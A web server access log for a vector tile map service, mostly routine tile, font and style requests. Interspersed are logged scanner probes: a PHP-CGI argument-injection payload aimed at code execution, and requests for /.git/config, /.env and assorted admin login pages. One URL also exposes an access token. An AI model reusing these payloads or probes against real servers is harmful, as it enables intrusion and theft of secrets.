{"level":"info","message":"GET /unvt/rest/info?f=json 404 9 - 2.745 ms"}
{"level":"info","message":"GET /unvt/rest/services/esriIF/UniteStreetMapVector/VectorTileServer?f=json&callback=dojo_request_script_callbacks.dojo_request_script0 200 3675 - 4.471 ms"}
{"level":"info","message":"GET /unvt/rest/services/esriIF/UniteStreetMapVector/VectorTileServer 200 3675 - 1.581 ms"}
{"level":"info","message":"GET /favicon.ico 404 9 - 0.321 ms"}
{"level":"info","message":"GET /unvt/rest/services/esriIF/UniteStreetMapVector/VectorTileServer?f=json 200 3675 - 1.072 ms"}
{"level":"info","message":"GET /unvt/rest/services/esriIF/UniteStreetMapVector/VectorTileServer/resources/styles/root.json?f=json 200 215751 - 2.666 ms"}
{"level":"info","message":"GET /unvt/rest/services/esriIF/UniteStreetMapVector/VectorTileServer?f=json 304 - - 1.488 ms"}
{"level":"info","message":"GET /unvt/sprite-rev/sprite_S.png 200 24866 - 1.601 ms"}
{"level":"info","message":"GET /unvt/sprite-rev/sprite_S.json 200 13660 - 3.650 ms"}
{"level":"info","message":"GET /unvt/rest/services/esriIF/UniteStreetMapVector/VectorTileServer/tilemap/0/0/0/32/32?f=json 200 2128 - 1.977 ms"}
{"level":"info","message":"GET /unvt/rest/services/esriIF/UniteStreetMapVector/VectorTileServer/tilemap/0/0/0/32/32?f=json 304 - - 1.041 ms"}
{"level":"info","message":"GET /unvt/VT-open/zxy/UniteStreetMapVector/0/0/0.pbf 200 100708 - 2.799 ms"}
{"level":"info","message":"GET /unvt/rest/services/esriIF/UniteStreetMapVector/VectorTileServer/tilemap/1/0/0/32/32?f=json 200 2128 - 0.702 ms"}
{"level":"info","message":"GET /unvt/rest/services/esriIF/UniteStreetMapVector/VectorTileServer/tilemap/1/0/0/32/32?f=json 304 - - 0.622 ms"}
{"level":"info","message":"GET /unvt/rest/services/esriIF/UniteStreetMapVector/VectorTileServer/tilemap/2/0/0/32/32?f=json 200 2128 - 0.702 ms"}
{"level":"info","message":"GET /unvt/rest/services/esriIF/UniteStreetMapVector/VectorTileServer/tilemap/2/0/0/32/32?f=json 304 - - 0.757 ms"}
{"level":"info","message":"GET /unvt/VT-open/zxy/UniteStreetMapVector/2/2/2.pbf 200 48323 - 53.159 ms"}
{"level":"info","message":"GET /unvt/VT-open/zxy/UniteStreetMapVector/2/3/2.pbf 200 71773 - 54.583 ms"}
{"level":"info","message":"GET /unvt/VT-open/zxy/UniteStreetMapVector/2/2/1.pbf 200 351876 - 56.001 ms"}
{"level":"info","message":"GET /unvt/VT-open/zxy/UniteStreetMapVector/2/3/1.pbf 200 225668 - 59.565 ms"}
{"level":"info","message":"GET /unvt/VT-open/zxy/UniteStreetMapVector/2/1/2.pbf 200 88039 - 59.802 ms"}
{"level":"info","message":"GET /unvt/VT-open/zxy/UniteStreetMapVector/2/1/1.pbf 200 195956 - 60.627 ms"}
{"level":"info","message":"GET /unvt/font/sans/0-255.pbf 200 79250 - 2.733 ms"}
{"level":"info","message":"GET /unvt/font/Open%20Sans%20Semibold%20Italic/0-255.pbf 200 80678 - 2.881 ms"}
{"level":"info","message":"GET /unvt/font/Open%20Sans%20Bold/0-255.pbf 200 80025 - 54.458 ms"}
{"level":"info","message":"GET /unvt/font/Open%20Sans%20Bold/256-511.pbf 200 70900 - 1.651 ms"}
{"level":"info","message":"GET /unvt/rest/services/esriIF/UniteStreetMapVector/VectorTileServer/tilemap/3/0/0/32/32?f=json 200 2128 - 0.631 ms"}
{"level":"info","message":"GET /unvt/rest/services/esriIF/UniteStreetMapVector/VectorTileServer/tilemap/3/0/0/32/32?f=json 304 - - 0.616 ms"}
{"level":"info","message":"GET /unvt/rest/services/esriIF/UniteStreetMapVector/VectorTileServer/tilemap/4/0/0/32/32?f=json 200 2128 - 0.753 ms"}
{"level":"info","message":"GET /unvt/rest/services/esriIF/UniteStreetMapVector/VectorTileServer/tilemap/4/0/0/32/32?f=json 304 - - 0.847 ms"}
{"level":"info","message":"GET /unvt/VT-open/zxy/UniteStreetMapVector/4/10/8.pbf 200 12931 - 7.825 ms"}
{"level":"info","message":"GET /unvt/VT-open/zxy/UniteStreetMapVector/4/10/7.pbf 200 11769 - 8.152 ms"}
{"level":"info","message":"GET /unvt/VT-open/zxy/UniteStreetMapVector/4/9/8.pbf 200 159148 - 9.723 ms"}
{"level":"info","message":"GET /unvt/VT-open/zxy/UniteStreetMapVector/4/9/7.pbf 200 100218 - 12.307 ms"}
{"level":"info","message":"GET /unvt/VT-open/zxy/UniteStreetMapVector/4/8/8.pbf 200 68342 - 13.271 ms"}
{"level":"info","message":"GET /unvt/VT-open/zxy/UniteStreetMapVector/4/8/7.pbf 200 83895 - 13.593 ms"}
{"level":"info","message":"GET /unvt/font/NotoSans-Regular/0-255.pbf 200 75736 - 2.006 ms"}
{"level":"info","message":"GET /unvt/font/NotoSans-Regular/8192-8447.pbf 200 52112 - 3.780 ms"}
{"level":"info","message":"GET /unvt/font/NotoSans-Regular/256-511.pbf 200 126528 - 2.920 ms"}
{"level":"info","message":"GET /unvt/font/NotoSans-Regular/7936-8191.pbf 200 126152 - 4.261 ms"}
{"level":"info","message":"GET /unvt/rest/services/esriIF/UniteStreetMapVector/VectorTileServer/tilemap/5/0/0/32/32?f=json 200 2128 - 0.779 ms"}
{"level":"info","message":"GET /unvt/rest/services/esriIF/UniteStreetMapVector/VectorTileServer/tilemap/5/0/0/32/32?f=json 304 - - 0.753 ms"}
{"level":"info","message":"GET /unvt/VT-open/zxy/UniteStreetMapVector/5/19/16.pbf 200 40406 - 5.652 ms"}
{"level":"info","message":"GET /unvt/VT-open/zxy/UniteStreetMapVector/5/20/16.pbf 200 1897 - 5.264 ms"}
{"level":"info","message":"GET /unvt/VT-open/zxy/UniteStreetMapVector/5/19/17.pbf 200 46334 - 5.887 ms"}
{"level":"info","message":"GET /unvt/VT-open/zxy/UniteStreetMapVector/5/20/17.pbf 200 15927 - 7.099 ms"}
{"level":"info","message":"GET /unvt/VT-open/zxy/UniteStreetMapVector/5/19/15.pbf 200 41207 - 7.264 ms"}
{"level":"info","message":"GET /unvt/VT-open/zxy/UniteStreetMapVector/5/20/15.pbf 200 9995 - 7.369 ms"}
{"level":"info","message":"GET /unvt/VT-open/zxy/UniteStreetMapVector/5/18/16.pbf 200 51491 - 8.360 ms"}
{"level":"info","message":"GET /unvt/VT-open/zxy/UniteStreetMapVector/5/18/15.pbf 200 45957 - 6.398 ms"}
{"level":"info","message":"GET /unvt/VT-open/zxy/UniteStreetMapVector/5/18/17.pbf 200 73505 - 6.678 ms"}
{"level":"info","message":"GET /unvt/rest/info?f=json 404 9 - 0.506 ms"}
{"level":"info","message":"GET /unvt/rest/services/esriIF/UniteStreetMapVector/VectorTileServer%0A?f=json 404 9 - 0.508 ms"}
{"level":"info","message":"POST /php-cgi/php-cgi.exe?%ADd+cgi.force_redirect%3D0+%ADd+disable_functions%3D%22%22+%ADd+allow_url_include%3D1+%ADd+auto_prepend_file%3Dphp://input 404 9 - 0.808 ms"}
{"level":"info","message":"GET /.git/config 404 9 - 0.381 ms"}
{"level":"info","message":"GET /.env 404 9 - 0.262 ms"}
{"level":"info","message":"GET /unvt/rest/services/esriIF/UniteStreetMapVector/VectorTileServer%0A?f=json 404 9 - 1.671 ms"}
{"level":"info","message":"GET /unvt/rest/services/esriIF/UniteStreetMapVector/VectorTileServer%0A?f=json 404 9 - 0.493 ms"}
{"level":"info","message":"GET /unvt/rest/services/esriIF/UniteStreetMapVector/VectorTileServer%0A?f=json 404 9 - 0.508 ms"}
{"level":"info","message":"GET /unvt/rest/services/esriIF/UniteStreetMapVector/VectorTileServer%0A?f=json 404 9 - 0.448 ms"}
{"level":"info","message":"GET / 404 9 - 0.328 ms"}
{"level":"info","message":"GET / 404 9 - 0.254 ms"}
{"level":"info","message":"GET /favicon.ico 404 9 - 0.264 ms"}
{"level":"info","message":"GET /robots.txt 404 9 - 0.241 ms"}
{"level":"info","message":"GET /sitemap.xml 404 9 - 0.194 ms"}
{"level":"info","message":"GET /geoserver 404 9 - 0.813 ms"}
{"level":"info","message":"GET / 404 9 - 0.394 ms"}
{"level":"info","message":"GET / 404 9 - 0.575 ms"}
{"level":"info","message":"GET / 404 9 - 0.297 ms"}
{"level":"info","message":"GET /favicon.ico 404 9 - 0.250 ms"}
{"level":"info","message":"GET /webui/ 404 9 - 0.766 ms"}
{"level":"info","message":"GET /favicon.ico 404 9 - 0.285 ms"}
{"level":"info","message":"GET / 404 9 - 0.239 ms"}
{"level":"info","message":"GET /geoserver/web/ 404 9 - 0.408 ms"}
{"level":"info","message":"GET /unvt/rest/info?f=json 404 9 - 0.928 ms"}
{"level":"info","message":"PROPFIND / 404 9 - 0.325 ms"}
{"level":"info","message":"GET /unvt/rest/services/esriIF/UniteStreetMapVector/VectorTileServer?f=json&callback=dojo_request_script_callbacks.dojo_request_script0 200 3675 - 1.666 ms"}
{"level":"info","message":"GET /unvt/rest/info?f=json 404 9 - 1.103 ms"}
{"level":"info","message":"GET /unvt/rest/services/esriIF/UniteStreetMapVector/VectorTileServer?f=json&callback=dojo_request_script_callbacks.dojo_request_script0 200 3675 - 1.129 ms"}
{"level":"info","message":"GET /unvt/rest/services/esriIF/UniteStreetMapVector/VectorTileServer 304 - - 0.832 ms"}
{"level":"info","message":"GET /.git/config 404 9 - 0.245 ms"}
{"level":"info","message":"GET /unvt/rest/services/esriIF/UniteStreetMapVector/VectorTileServer/resources/styles/root.json?f=pjson&token=m8vAxaa8CBcxqomyNrQX_nlgwrKvQJC7ZNSekfdajaEXLA20YTyDyL166lOEMZQ6Ut4LTv52zuPNAwJRscC96PeHrkDfd4UIf2Wcac1aw5WzlVEJuPrK7f-jCcZZYMRcrJ1QNxzLGFxKXt5PE1eGwfyzfeDNvjl4fRXy6ESwKjNiIa8rRIsETv0KsR4WdoWaJWMOCF32Jt25pKmeBkhC0cfyQC15uNtlizXptgojsSQ. 200 215751 - 1.877 ms"}
{"level":"info","message":"GET / 404 9 - 0.495 ms"}
{"level":"info","message":"GET /robots.txt 404 9 - 0.236 ms"}
{"level":"info","message":"GET /sitemap.xml 404 9 - 0.326 ms"}
{"level":"info","message":"GET /.well-known/security.txt 404 9 - 0.252 ms"}
{"level":"info","message":"GET /favicon.ico 404 9 - 0.294 ms"}
{"level":"info","message":"GET / 404 9 - 0.850 ms"}
{"level":"info","message":"GET /robots.txt 404 9 - 0.318 ms"}
{"level":"info","message":"GET /sitemap.xml 404 9 - 0.234 ms"}
{"level":"info","message":"GET /.well-known/security.txt 404 9 - 0.232 ms"}
{"level":"info","message":"GET /favicon.ico 404 9 - 0.243 ms"}
{"level":"info","message":"GET / 404 9 - 0.312 ms"}
{"level":"info","message":"GET / 404 9 - 0.263 ms"}
{"level":"info","message":"GET /manage/account/login 404 9 - 0.291 ms"}
{"level":"info","message":"GET /admin/index.html 404 9 - 0.446 ms"}
{"level":"info","message":"GET /admin/index.html 404 9 - 0.281 ms"}
{"level":"info","message":"GET /index.html 404 9 - 0.300 ms"}
{"level":"info","message":"GET /index.html 404 9 - 0.238 ms"}
{"level":"info","message":"GET /+CSCOE+/logon.html 404 9 - 0.239 ms"}
{"level":"info","message":"GET /+CSCOE+/logon.html 404 9 - 0.232 ms"}
{"level":"info","message":"GET /cgi-bin/login.cgi 404 9 - 0.256 ms"}
{"level":"info","message":"GET /cgi-bin/login.cgi 404 9 - 0.381 ms"}
{"level":"info","message":"GET /login.htm 404 9 - 0.320 ms"}
{"level":"info","message":"GET /login.htm 404 9 - 0.513 ms"}
{"level":"info","message":"GET /login.html 404 9 - 0.280 ms"}
{"level":"info","message":"GET /login.html 404 9 - 0.274 ms"}
{"level":"info","message":"GET /login.jsp 404 9 - 0.263 ms"}
{"level":"info","message":"GET /login.jsp 404 9 - 0.255 ms"}
{"level":"info","message":"GET /login 404 9 - 0.259 ms"}
{"level":"info","message":"GET /doc/index.html 404 9 - 0.237 ms"}
{"level":"info","message":"GET /doc/index.html 404 9 - 0.249 ms"}
{"level":"info","message":"GET /remote/login 404 9 - 0.271 ms"}
{"level":"info","message":"GET /remote/login 404 9 - 0.329 ms"}
{"level":"info","message":"GET //admin/login.asp 404 9 - 0.270 ms"}
{"level":"info","message":"GET //admin/login.asp 404 9 - 0.305 ms"}
{"level":"info","message":"GET /web/ 404 9 - 0.334 ms"}
{"level":"info","message":"GET /web/ 404 9 - 0.280 ms"}
{"level":"info","message":"GET //webpages/login.html 404 9 - 0.229 ms"}
{"level":"info","message":"GET //webpages/login.html 404 9 - 0.245 ms"}
{"level":"info","message":"GET http://141.76.94.18:80/pscan 404 9 - 0.874 ms"}
{"level":"info","message":"GET /unvt/rest/services/esriIF/UniteStreetMapVector/VectorTileServer%0A?f=json 404 9 - 0.893 ms"}
{"level":"info","message":"GET /unvt/rest/services/esriIF/UniteStreetMapVector/VectorTileServer%0A?f=json 404 9 - 0.839 ms"}
{"level":"info","message":"GET /wp-admin/setup-config.php 404 9 - 0.378 ms"}
{"level":"info","message":"GET /wordpress/wp-admin/setup-config.php 404 9 - 0.260 ms"}
{"level":"info","message":"PROPFIND / 404 9 - 0.732 ms"}
{"level":"info","message":"GET /unvt/rest/info?f=json 404 9 - 0.717 ms"}
{"level":"info","message":"GET /unvt/rest/services/esriIF/UniteStreetMapVector/VectorTileServer?f=json 200 3675 - 1.611 ms"}
{"level":"info","message":"GET /unvt/rest/services/esriIF/UniteStreetMapVector/VectorTileServer/resources/styles/?f=json 200 215751 - 2.181 ms"}
{"level":"info","message":"GET /unvt/rest/services/esriIF/UniteStreetMapVector/VectorTileServer/?f=json 200 3675 - 0.956 ms"}
{"level":"info","message":"GET /unvt/sprite-rev/sprite_S.json 200 13660 - 0.763 ms"}
{"level":"info","message":"GET /unvt/sprite-rev/sprite_S.png 200 24866 - 0.684 ms"}
{"level":"info","message":"GET /unvt/VT-open/zxy/UniteStreetMapVector/0/0/0.pbf 200 100708 - 2.656 ms"}
{"level":"info","message":"GET /unvt/rest/services/esriIF/UniteStreetMapVector/VectorTileServer/tilemap/1/0/0/8/8 404 81 - 0.734 ms"}
{"level":"info","message":"GET /unvt/rest/services/esriIF/UniteStreetMapVector/VectorTileServer/tilemap/2/0/0/8/8 404 81 - 0.600 ms"}
{"level":"info","message":"GET /unvt/rest/services/esriIF/UniteStreetMapVector/VectorTileServer/tilemap/1/0/0/8/8 404 81 - 0.606 ms"}
{"level":"info","message":"GET /unvt/rest/services/esriIF/UniteStreetMapVector/VectorTileServer/tilemap/2/0/0/8/8 404 81 - 0.372 ms"}
{"level":"info","message":"GET /unvt/rest/services/esriIF/UniteStreetMapVector/VectorTileServer/tilemap/1/0/0/8/8 404 81 - 0.346 ms"}
{"level":"info","message":"GET /unvt/rest/services/esriIF/UniteStreetMapVector/VectorTileServer/tilemap/1/0/0/8/8 404 81 - 0.315 ms"}
{"level":"info","message":"GET /unvt/rest/services/esriIF/UniteStreetMapVector/VectorTileServer/tilemap/2/0/0/8/8 404 81 - 0.608 ms"}
{"level":"info","message":"GET /unvt/rest/services/esriIF/UniteStreetMapVector/VectorTileServer/tilemap/2/0/0/8/8 404 81 - 0.316 ms"}
{"level":"info","message":"GET /unvt/rest/services/esriIF/UniteStreetMapVector/VectorTileServer/tilemap/1/0/0/8/8 404 81 - 0.829 ms"}
{"level":"info","message":"GET /unvt/rest/services/esriIF/UniteStreetMapVector/VectorTileServer/tilemap/2/0/0/8/8 404 81 - 0.636 ms"}
{"level":"info","message":"GET /unvt/rest/services/esriIF/UniteStreetMapVector/VectorTileServer/tilemap/2/0/0/8/8 404 81 - 0.387 ms"}
{"level":"info","message":"GET /unvt/rest/services/esriIF/UniteStreetMapVector/VectorTileServer/tilemap/2/0/0/8/8 404 81 - 0.280 ms"}
{"level":"info","message":"GET /unvt/rest/services/esriIF/UniteStreetMapVector/VectorTileServer/tilemap/3/0/0/8/8 404 81 - 2.770 ms"}
{"level":"info","message":"GET /unvt/rest/services/esriIF/UniteStreetMapVector/VectorTileServer/tilemap/3/0/0/8/8 404 81 - 0.398 ms"}
{"level":"info","message":"GET /unvt/rest/services/esriIF/UniteStreetMapVector/VectorTileServer/tilemap/3/0/0/8/8 404 81 - 0.492 ms"}
{"level":"info","message":"GET /unvt/rest/services/esriIF/UniteStreetMapVector/VectorTileServer/tilemap/3/0/0/8/8 404 81 - 0.318 ms"}
{"level":"info","message":"GET /unvt/rest/services/esriIF/UniteStreetMapVector/VectorTileServer/tilemap/3/0/0/8/8 404 81 - 0.451 ms"}
{"level":"info","message":"GET /unvt/rest/services/esriIF/UniteStreetMapVector/VectorTileServer/tilemap/3/0/0/8/8 404 81 - 0.389 ms"}
{"level":"info","message":"GET /unvt/rest/services/esriIF/UniteStreetMapVector/VectorTileServer/tilemap/1/0/0/8/8 404 81 - 0.480 ms"}
{"level":"info","message":"GET /unvt/rest/services/esriIF/UniteStreetMapVector/VectorTileServer/tilemap/1/0/0/8/8 404 81 - 0.467 ms"}
{"level":"info","message":"GET /unvt/rest/services/esriIF/UniteStreetMapVector/VectorTileServer/tilemap/2/0/0/8/8 404 81 - 0.491 ms"}
{"level":"info","message":"GET /unvt/rest/services/esriIF/UniteStreetMapVector/VectorTileServer/tilemap/2/0/0/8/8 404 81 - 0.554 ms"}
{"level":"info","message":"GET /unvt/rest/services/esriIF/UniteStreetMapVector/VectorTileServer/tilemap/2/0/0/8/8 404 81 - 0.468 ms"}
{"level":"info","message":"GET /unvt/rest/services/esriIF/UniteStreetMapVector/VectorTileServer/tilemap/2/0/0/8/8 404 81 - 0.558 ms"}
{"level":"info","message":"GET /unvt/rest/services/esriIF/UniteStreetMapVector/VectorTileServer/tilemap/2/0/0/8/8 404 81 - 0.548 ms"}
{"level":"info","message":"GET /unvt/rest/services/esriIF/UniteStreetMapVector/VectorTileServer/tilemap/3/0/0/8/8 404 81 - 0.539 ms"}
{"level":"info","message":"GET /unvt/rest/services/esriIF/UniteStreetMapVector/VectorTileServer/tilemap/3/0/0/8/8 404 81 - 0.552 ms"}
{"level":"info","message":"GET /unvt/rest/services/esriIF/UniteStreetMapVector/VectorTileServer/tilemap/3/0/0/8/8 404 81 - 0.641 ms"}
{"level":"info","message":"GET /unvt/rest/services/esriIF/UniteStreetMapVector/VectorTileServer/tilemap/3/0/0/8/8 404 81 - 0.619 ms"}
{"level":"info","message":"GET /unvt/rest/services/esriIF/UniteStreetMapVector/VectorTileServer/tilemap/3/0/0/8/8 404 81 - 0.509 ms"}
{"level":"info","message":"GET /unvt/rest/services/esriIF/UniteStreetMapVector/VectorTileServer/tilemap/3/0/0/8/8 404 81 - 0.569 ms"}
{"level":"info","message":"GET /unvt/rest/services/esriIF/UniteStreetMapVector/VectorTileServer/tilemap/4/8/8/8/8 404 81 - 0.661 ms"}
{"level":"info","message":"GET /unvt/rest/services/esriIF/UniteStreetMapVector/VectorTileServer/tilemap/4/8/8/8/8 404 81 - 0.779 ms"}
{"level":"info","message":"GET /unvt/rest/services/esriIF/UniteStreetMapVector/VectorTileServer/tilemap/4/0/8/8/8 404 81 - 0.617 ms"}
{"level":"info","message":"GET /unvt/rest/services/esriIF/UniteStreetMapVector/VectorTileServer/tilemap/4/8/8/8/8 404 81 - 1.982 ms"}
{"level":"info","message":"GET /unvt/rest/services/esriIF/UniteStreetMapVector/VectorTileServer/tilemap/4/0/8/8/8 404 81 - 0.891 ms"}
{"level":"info","message":"GET /unvt/rest/services/esriIF/UniteStreetMapVector/VectorTileServer/tilemap/4/0/8/8/8 404 81 - 0.627 ms"}
{"level":"info","message":"GET /unvt/rest/services/esriIF/UniteStreetMapVector/VectorTileServer/tilemap/5/16/16/8/8 404 83 - 1.994 ms"}
{"level":"info","message":"GET /unvt/rest/services/esriIF/UniteStreetMapVector/VectorTileServer/tilemap/5/16/16/8/8 404 83 - 1.579 ms"}
{"level":"info","message":"GET /unvt/rest/services/esriIF/UniteStreetMapVector/VectorTileServer/tilemap/5/8/16/8/8 404 82 - 0.904 ms"}
{"level":"info","message":"GET /unvt/rest/services/esriIF/UniteStreetMapVector/VectorTileServer/tilemap/5/16/16/8/8 404 83 - 0.832 ms"}
{"level":"info","message":"GET /unvt/rest/services/esriIF/UniteStreetMapVector/VectorTileServer/tilemap/5/16/16/8/8 404 83 - 1.071 ms"}
{"level":"info","message":"GET /unvt/rest/services/esriIF/UniteStreetMapVector/VectorTileServer/tilemap/5/16/16/8/8 404 83 - 0.729 ms"}
{"level":"info","message":"GET /unvt/rest/services/esriIF/UniteStreetMapVector/VectorTileServer/tilemap/5/16/16/8/8 404 83 - 0.372 ms"}
{"level":"info","message":"GET /unvt/rest/services/esriIF/UniteStreetMapVector/VectorTileServer/tilemap/4/8/8/8/8 404 81 - 0.472 ms"}
{"level":"info","message":"GET /unvt/rest/services/esriIF/UniteStreetMapVector/VectorTileServer/tilemap/5/8/16/8/8 404 82 - 0.364 ms"}
{"level":"info","message":"GET /unvt/rest/services/esriIF/UniteStreetMapVector/VectorTileServer/tilemap/5/8/16/8/8 404 82 - 0.466 ms"}
{"level":"info","message":"GET /unvt/rest/services/esriIF/UniteStreetMapVector/VectorTileServer/tilemap/6/24/32/8/8 404 83 - 0.668 ms"}
{"level":"info","message":"GET /unvt/rest/services/esriIF/UniteStreetMapVector/VectorTileServer/tilemap/6/24/32/8/8 404 83 - 0.555 ms"}
{"level":"info","message":"GET /unvt/rest/services/esriIF/UniteStreetMapVector/VectorTileServer/tilemap/6/24/32/8/8 404 83 - 0.334 ms"}
{"level":"info","message":"GET /unvt/rest/services/esriIF/UniteStreetMapVector/VectorTileServer/tilemap/6/32/32/8/8 404 83 - 0.482 ms"}
{"level":"info","message":"GET /unvt/rest/services/esriIF/UniteStreetMapVector/VectorTileServer/tilemap/6/32/32/8/8 404 83 - 0.315 ms"}
{"level":"info","message":"GET /unvt/rest/services/esriIF/UniteStreetMapVector/VectorTileServer/tilemap/4/0/8/8/8 404 81 - 0.512 ms"}
{"level":"info","message":"GET /unvt/rest/services/esriIF/UniteStreetMapVector/VectorTileServer/tilemap/4/8/8/8/8 404 81 - 0.470 ms"}
{"level":"info","message":"GET /unvt/rest/services/esriIF/UniteStreetMapVector/VectorTileServer/tilemap/6/32/32/8/8 404 83 - 0.708 ms"}
{"level":"info","message":"GET /unvt/rest/services/esriIF/UniteStreetMapVector/VectorTileServer/tilemap/6/32/32/8/8 404 83 - 0.422 ms"}
{"level":"info","message":"GET /unvt/rest/services/esriIF/UniteStreetMapVector/VectorTileServer/tilemap/6/32/32/8/8 404 83 - 0.307 ms"}
{"level":"info","message":"GET /unvt/rest/services/esriIF/UniteStreetMapVector/VectorTileServer/tilemap/6/32/32/8/8 404 83 - 0.371 ms"}
{"level":"info","message":"GET /unvt/rest/services/esriIF/UniteStreetMapVector/VectorTileServer/tilemap/4/0/8/8/8 404 81 - 0.549 ms"}
{"level":"info","message":"GET /unvt/rest/services/esriIF/UniteStreetMapVector/VectorTileServer/tilemap/4/0/8/8/8 404 81 - 0.531 ms"}
{"level":"info","message":"GET /unvt/rest/services/esriIF/UniteStreetMapVector/VectorTileServer/tilemap/5/16/16/8/8 404 83 - 0.516 ms"}
{"level":"info","message":"GET /unvt/rest/services/esriIF/UniteStreetMapVector/VectorTileServer/tilemap/5/16/16/8/8 404 83 - 0.451 ms"}
{"level":"info","message":"GET /unvt/rest/services/esriIF/UniteStreetMapVector/VectorTileServer/tilemap/5/8/16/8/8 404 82 - 0.514 ms"}
{"level":"info","message":"GET /unvt/rest/services/esriIF/UniteStreetMapVector/VectorTileServer/tilemap/5/16/16/8/8 404 83 - 0.547 ms"}
{"level":"info","message":"GET /unvt/rest/services/esriIF/UniteStreetMapVector/VectorTileServer/tilemap/5/16/16/8/8 404 83 - 0.510 ms"}
{"level":"info","message":"GET /unvt/rest/services/esriIF/UniteStreetMapVector/VectorTileServer/tilemap/5/16/16/8/8 404 83 - 0.493 ms"}
{"level":"info","message":"GET /unvt/rest/services/esriIF/UniteStreetMapVector/VectorTileServer/tilemap/5/16/16/8/8 404 83 - 0.508 ms"}
{"level":"info","message":"GET /unvt/rest/services/esriIF/UniteStreetMapVector/VectorTileServer/tilemap/5/8/16/8/8 404 82 - 0.485 ms"}
{"level":"info","message":"GET /unvt/rest/services/esriIF/UniteStreetMapVector/VectorTileServer/tilemap/5/8/16/8/8 404 82 - 0.501 ms"}
{"level":"info","message":"GET /unvt/rest/services/esriIF/UniteStreetMapVector/VectorTileServer/tilemap/6/24/32/8/8 404 83 - 0.527 ms"}
{"level":"info","message":"GET /unvt/rest/services/esriIF/UniteStreetMapVector/VectorTileServer/tilemap/6/24/32/8/8 404 83 - 0.629 ms"}
{"level":"info","message":"GET /unvt/rest/services/esriIF/UniteStreetMapVector/VectorTileServer/tilemap/6/24/40/8/8 404 83 - 1.031 ms"}
{"level":"info","message":"GET /unvt/rest/services/esriIF/UniteStreetMapVector/VectorTileServer/tilemap/6/32/40/8/8 404 83 - 0.861 ms"}
{"level":"info","message":"GET /unvt/rest/services/esriIF/UniteStreetMapVector/VectorTileServer/tilemap/6/32/40/8/8 404 83 - 0.371 ms"}
{"level":"info","message":"GET /unvt/rest/services/esriIF/UniteStreetMapVector/VectorTileServer/tilemap/6/24/32/8/8 404 83 - 0.547 ms"}
{"level":"info","message":"GET /unvt/rest/services/esriIF/UniteStreetMapVector/VectorTileServer/tilemap/6/32/32/8/8 404 83 - 0.445 ms"}
{"level":"info","message":"GET /unvt/rest/services/esriIF/UniteStreetMapVector/VectorTileServer/tilemap/6/32/32/8/8 404 83 - 1.285 ms"}
{"level":"info","message":"GET /unvt/rest/services/esriIF/UniteStreetMapVector/VectorTileServer/tilemap/6/32/32/8/8 404 83 - 0.518 ms"}
{"level":"info","message":"GET /unvt/rest/services/esriIF/UniteStreetMapVector/VectorTileServer/tilemap/6/32/32/8/8 404 83 - 0.510 ms"}
{"level":"info","message":"GET /unvt/rest/services/esriIF/UniteStreetMapVector/VectorTileServer/tilemap/6/32/32/8/8 404 83 - 0.504 ms"}
{"level":"info","message":"GET /unvt/rest/services/esriIF/UniteStreetMapVector/VectorTileServer/tilemap/6/32/32/8/8 404 83 - 0.475 ms"}
{"level":"info","message":"GET /unvt/rest/services/esriIF/UniteStreetMapVector/VectorTileServer/tilemap/6/24/40/8/8 404 83 - 0.684 ms"}
{"level":"info","message":"GET /unvt/rest/services/esriIF/UniteStreetMapVector/VectorTileServer/tilemap/6/32/40/8/8 404 83 - 0.515 ms"}
{"level":"info","message":"GET /unvt/rest/services/esriIF/UniteStreetMapVector/VectorTileServer/tilemap/6/32/40/8/8 404 83 - 0.619 ms"}
{"level":"info","message":"GET /unvt/rest/services/esriIF/UniteStreetMapVector/VectorTileServer?f=json 304 - - 0.742 ms"}
{"level":"info","message":"GET /unvt/rest/services/esriIF/UniteStreetMapVector/VectorTileServer/resources/styles/root.json?f=json 304 - - 0.652 ms"}
{"level":"info","message":"GET /unvt/rest/services/esriIF/UniteStreetMapVector/VectorTileServer?f=json 304 - - 0.668 ms"}
{"level":"info","message":"GET /unvt/sprite-rev/sprite_S.json 304 - - 0.792 ms"}
{"level":"info","message":"GET /unvt/sprite-rev/sprite_S.png 304 - - 0.552 ms"}
{"level":"info","message":"GET /unvt/rest/services/esriIF/UniteStreetMapVector/VectorTileServer/tilemap/0/0/0/32/32?f=json 304 - - 0.596 ms"}
{"level":"info","message":"GET /unvt/rest/services/esriIF/UniteStreetMapVector/VectorTileServer/tilemap/0/0/0/32/32?f=json 304 - - 0.490 ms"}
{"level":"info","message":"GET /unvt/rest/services/esriIF/UniteStreetMapVector/VectorTileServer/tilemap/1/0/0/32/32?f=json 304 - - 0.529 ms"}
{"level":"info","message":"GET /unvt/rest/services/esriIF/UniteStreetMapVector/VectorTileServer/tilemap/1/0/0/32/32?f=json 304 - - 0.546 ms"}
{"level":"info","message":"GET /unvt/VT-open/zxy/UniteStreetMapVector/1/1/1.pbf 200 25942 - 4.136 ms"}
{"level":"info","message":"GET /unvt/VT-open/zxy/UniteStreetMapVector/1/0/1.pbf 200 22607 - 4.553 ms"}
{"level":"info","message":"GET /unvt/VT-open/zxy/UniteStreetMapVector/1/1/0.pbf 200 76538 - 6.313 ms"}
{"level":"info","message":"GET /unvt/VT-open/zxy/UniteStreetMapVector/1/0/0.pbf 200 80184 - 6.713 ms"}
{"level":"info","message":"GET /unvt/font/Open%20Sans%20Bold/0-255.pbf 304 - - 0.507 ms"}
{"level":"info","message":"GET /unvt/font/Open%20Sans%20Semibold%20Italic/0-255.pbf 304 - - 0.852 ms"}
{"level":"info","message":"GET /unvt/font/sans/0-255.pbf 304 - - 0.739 ms"}
{"level":"info","message":"GET /unvt/font/Open%20Sans%20Italic/0-255.pbf 200 78054 - 3.049 ms"}
{"level":"info","message":"GET /unvt/rest/services/esriIF/UniteStreetMapVector/VectorTileServer/tilemap/2/0/0/32/32?f=json 304 - - 0.515 ms"}
{"level":"info","message":"GET /unvt/rest/services/esriIF/UniteStreetMapVector/VectorTileServer/tilemap/3/0/0/32/32?f=json 304 - - 0.558 ms"}
{"level":"info","message":"GET /unvt/rest/services/esriIF/UniteStreetMapVector/VectorTileServer/tilemap/2/0/0/32/32?f=json 304 - - 0.469 ms"}
{"level":"info","message":"GET /unvt/rest/services/esriIF/UniteStreetMapVector/VectorTileServer/tilemap/3/0/0/32/32?f=json 304 - - 0.334 ms"}
{"level":"info","message":"GET /unvt/VT-open/zxy/UniteStreetMapVector/3/5/4.pbf 200 10206 - 9.651 ms"}
{"level":"info","message":"GET /unvt/VT-open/zxy/UniteStreetMapVector/3/4/4.pbf 200 183936 - 9.970 ms"}
